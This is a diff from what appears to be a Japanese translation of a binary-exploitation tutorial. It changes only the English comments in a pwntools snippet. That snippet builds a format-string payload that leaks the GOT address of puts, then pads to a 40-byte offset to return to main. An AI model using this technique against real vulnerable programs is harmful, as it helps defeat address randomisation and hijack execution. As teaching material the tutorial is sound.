@@ -77,20 +77,20 @@ payload = flat(
 理論は同じですが、スタックの空きが限られている場合や、ROP チェーンがスタックを変化させて以降のペイロードを複雑にしてしまう場合(たとえば stack pivoting のとき)に役立ちます。
 
 ```python
-payload = p32(elf.got['puts'])      # p64() if 64-bit
+payload = p32(elf.got['puts'])      # 64 ビットなら p64()
 payload += b'|'
-payload += b'%3$s'                  # The third parameter points at the start of the buffer
+payload += b'%3$s'                  # 3 番目の引数がバッファの先頭を指す
 
 
-# this part is only relevant if you need to call the function again
+# この部分は、関数をもう一度呼ぶ必要がある場合にだけ関係する
 
-payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
+payload = payload.ljust(40, b'A')   # 40 は、命令ポインタを上書きし始めるまでのオフセット
 payload += p32(elf.symbols['main'])
 
-# Send it off...
+# 送信する...
 
-p.recvuntil(b'|')                   # This is not required
-puts_leak = u32(p.recv(4))          # 4 bytes because it's 32-bit
+p.recvuntil(b'|')                   # これは必須ではない
+puts_leak = u32(p.recv(4))          # 32 ビットなので 4 バイト
 ```
 
 ## まとめ
